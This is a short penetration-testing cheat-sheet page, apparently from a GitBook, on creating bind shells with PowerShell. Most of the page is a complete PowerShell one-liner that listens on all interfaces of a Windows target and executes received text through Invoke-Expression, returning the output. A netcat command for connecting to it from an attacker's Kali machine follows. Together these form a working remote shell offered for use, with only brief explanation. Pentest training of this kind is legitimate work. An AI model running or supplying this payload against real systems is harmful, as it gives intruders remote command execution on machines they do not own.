---
description: Creating bind shells with PowerShell
---

# PowerShell

## Basic Bind Shell

### Target Machine

The target machine must first start a listener and _bind_ it to a network port. This example shows a one-liner that would be run on the Windows Command Prompt (`cmd.exe`).

{% code overflow="wrap" %}
```shell
C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{PORT});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()" 
```
{% endcode %}

* `0.0.0.0` is used as the IP address so the bind shell will be available on all IP addresses on the system
* `{PORT}` is substituted for the desired listening port
  * E.g. for port 443 `TcpListener('0.0.0.0',443)`
* `iex` (alias for `Invoke-Expression`) is used to run the received strings as commands on the system

### Attacker Machine

The attacker can then just reach out to the listening bind shell via normal methods. In this example the attacker is using netcat on a Kali system.

```bash
kali@kali:~$ nc -nv {Target-IP} {Target-PORT}
```

* include the `-v` option for Netcat as the bind shell may not always present a command prompt when it first connects
